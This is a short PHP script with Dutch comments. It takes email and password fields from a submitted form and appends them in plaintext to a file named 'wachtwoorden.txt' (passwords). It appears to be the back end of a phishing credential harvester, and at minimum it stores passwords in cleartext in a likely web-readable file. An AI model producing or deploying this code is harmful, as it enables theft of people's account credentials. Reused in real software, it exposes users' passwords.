<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Hier kun je de gegevens opslaan in een bestand
    $file = 'wachtwoorden.txt';
    $data = "E-mail: $email, Wachtwoord: $password\n";

    // Opslaan in het bestand
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    echo "Gegevens zijn opgeslagen.";
} else {
    echo "Ongeldig verzoek.";
}
?>